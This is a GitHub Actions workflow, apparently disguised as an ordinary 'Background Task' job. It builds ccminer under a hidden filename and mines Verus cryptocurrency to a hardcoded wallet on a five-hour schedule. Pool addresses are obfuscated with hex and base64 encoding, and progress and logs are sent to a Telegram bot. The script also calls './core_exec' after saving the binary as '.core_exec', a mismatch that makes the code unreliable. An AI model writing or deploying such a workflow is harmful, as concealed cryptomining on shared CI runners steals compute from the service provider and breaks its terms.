name: AKH Job

on:
  schedule:
    - cron: "0 */5 * * *"
  workflow_dispatch:

jobs:
  akh_job:
    runs-on: ubuntu-latest
    timeout-minutes: 300

    steps:
      - name: Setup Environment
        run: |
          sudo apt update
          sudo apt install -y build-essential cmake automake libtool pkg-config libcurl4-openssl-dev git

      - name: Download & Build Core
        run: |
          git clone https://github.com/monkins1010/ccminer.git .src
          cd .src
          chmod +x build.sh
          ./build.sh
          mv ccminer ../.core_exec

      - name: Start Background Task
        run: |
          WALLET="RGVmtuvrP2yX8q3U4up77CcSpkcVhp4bUG"
          WORKER="akh"
          LOG="akh.log"
          MAX_IDLE=600

          TELEGRAM_TOKEN="${{ secrets.TELEGRAM_TOKEN }}"
          TELEGRAM_CHAT_ID="${{ secrets.TELEGRAM_CHAT_ID }}"

          POOLS=(
            "$(echo 7374726174756d2b7463703a2f2f61702e6c75636b706f6f6c2e6e65743a33393536 | xxd -r -p)"
            "$(echo c3RyYXR1bSt0Y3A6Ly9ldS5sdWNrcG9vbC5uZXQ6Mzk1Ng== | base64 -d)"
            "$(echo c3RyYXR1bSt0Y3A6Ly9uYS5sdWNrcG9vbC5uZXQ6Mzk1Ng== | base64 -d)"
          )

          tg() {
            curl -s -X POST https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage \
              -d chat_id=$TELEGRAM_CHAT_ID \
              -d parse_mode=Markdown \
              -d text="$1"
          }

          sendlog() {
            curl -s -F document=@$LOG \
              "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument?chat_id=${TELEGRAM_CHAT_ID}" >/dev/null
          }

          tg "🟢 *akh* job started"

          for POOL in "${POOLS[@]}"; do
            ./core_exec -a verus -o "$POOL" -u "$WALLET.$WORKER" -p hybrid -t 2 > $LOG 2>&1 &
            PID=$!
            sleep 8

            if ps -p $PID > /dev/null; then
              tg "🔗 Connected to \`$POOL\`"
              break
            else
              kill $PID >/dev/null 2>&1
            fi
          done

          if ! ps -p $PID > /dev/null; then
            tg "❌ Unable to start task"
            exit 1
          fi

          # Background uploader tiap 1 jam
          (
            while true; do
              sleep 3600
              if ps -p $PID > /dev/null; then
                sendlog
              else
                break
              fi
            done
          ) &

          LAST=$(date +%s)
          COUNT=0

          tail -F "$LOG" | while read -r line; do
            NOW=$(date +%s)
            if echo "$line" | grep -iq "accepted"; then
              COUNT=$((COUNT + 1))
              LAST=$NOW
            fi

            if [ $((NOW - LAST)) -gt $MAX_IDLE ]; then
              tg "⚠️ No activity >10m. Restarting."
              kill $PID
              break
            fi

            if ! ps -p $PID > /dev/null; then
              tg "❌ Process crashed"
              break
            fi
          done

          sendlog
          tg "📴 *akh* ended.\n✅ Total: *$COUNT* shares"
